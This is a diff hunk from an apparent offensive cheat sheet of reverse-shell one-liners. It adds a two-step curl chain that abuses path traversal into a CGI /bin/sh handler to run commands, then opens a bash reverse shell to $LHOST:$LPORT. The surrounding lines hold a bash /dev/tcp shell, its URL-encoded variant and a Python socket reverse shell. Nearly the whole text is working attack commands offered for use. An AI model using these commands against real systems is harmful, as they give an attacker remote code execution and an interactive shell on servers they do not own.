@@ -5347,6 +5347,15 @@ bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
 # URL encoded version (for web shells/curl):
 bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'
 
+# ── CURL DELIVERY (path traversal / CGI RCE)
+# Step 1: confirm bash path on target first
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; which bash" \
+  "http://$ip/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+# Step 2: fire with confirmed path — may be /usr/bin/bash not /bin/bash
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; /usr/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" \
+  "http://$ip/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+# URL path = CGI handler (/bin/sh); your bash path goes in the POST body
+
 # Python3
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
